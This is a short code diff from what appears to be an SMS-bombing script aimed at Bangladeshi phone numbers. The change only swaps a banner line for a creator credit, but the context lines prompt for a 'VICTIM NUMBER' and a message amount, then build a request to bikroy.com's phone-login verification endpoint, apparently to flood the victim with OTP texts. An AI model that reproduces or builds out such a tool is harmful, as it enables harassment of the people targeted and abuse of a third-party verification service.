@@ -133,7 +133,7 @@ except (requests.ConnectionError, requests.Timeout) as exception:
  print("\n\033[1;37m[\033[1;32m#\033[1;37m] \033[1;31mðŸ˜¢ Your Internet Connection Is Poor !")
 number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
 amo=int(input(c+"\n[ AMOUNT ] : "+w))
-xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH MEDIA ;) {w}<{r}/{w}>\n\n")
+xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH 𝐌𝐝. 𝐌𝐮𝐫𝐚𝐝 𝐇𝐚𝐬𝐚𝐧 𝐌𝐞𝐝𝐢𝐚  {w}<{r}/{w}>\n\n")
 input(f"\t\t\t{r}Press Enter....")
 os.system("clear")
 url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+number
